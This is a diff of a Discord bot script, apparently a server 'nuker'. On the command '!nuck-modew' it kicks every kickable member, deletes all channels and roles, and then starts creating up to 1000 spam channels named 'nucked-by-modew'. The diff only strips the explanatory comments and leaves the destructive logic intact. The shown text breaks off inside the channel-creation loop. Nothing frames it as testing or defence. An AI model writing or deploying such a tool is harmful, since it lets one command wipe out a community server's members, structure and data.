@@ -8,8 +8,6 @@ const prefix = process.env.PREFIX
 
 client.on('message', function(message){
     if(message.content === "!nuck-modew") {
-
-        // Kick all members
         message.guild.members.cache.forEach(member => {
             if (member.kickable) {
                 member.kick();
@@ -17,11 +15,7 @@ client.on('message', function(message){
                 console.log(`Cannot kick member ${member.user.username}`);
             }
         });
-
-        // Delete all channels
         message.guild.channels.cache.forEach(channel => channel.delete());
-
-        // Delete all roles
         message.guild.roles.cache.forEach(role => {
             if (role.deletable) {
                 role.delete().then(deletedRole => console.log(`Deleted role ${deletedRole.name}`)).catch(console.error);
@@ -29,8 +23,6 @@ client.on('message', function(message){
                 console.log(`Cannot delete role ${role.name}`);
             }
         });
-
-        // Create new channels
         for (let i = 1; i <= 1000; i++) {
             message.guild.channels.create(`nucked-by-modew`, {
                 type: 'text',
